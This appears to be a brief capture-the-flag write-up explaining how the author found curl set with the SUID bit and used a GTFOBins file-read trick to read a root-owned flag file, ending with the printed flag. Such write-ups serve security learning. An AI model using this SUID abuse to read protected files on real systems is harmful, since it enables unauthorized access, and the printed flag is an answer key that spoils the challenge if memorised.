# All your flags are belong to root


When using curl to download linpeas, I noticed the group owner was changed to root instead of the regular user I was on the box with.

Checking the curl permissions, it looks like it has an SUID bit set. So I can use the file read from GTFOBins to read the flag which is in the root directory

```bash
LFILE=/flag
curl file://$LFILE
```
![image](https://user-images.githubusercontent.com/80063008/136172237-db11ec2a-5ffe-45e9-932b-bc990df52a6a.png)


SNYK{06b0e0ae4995af71335eda2882fecbc5008b01d95990982b439f3f8365fc07f7}
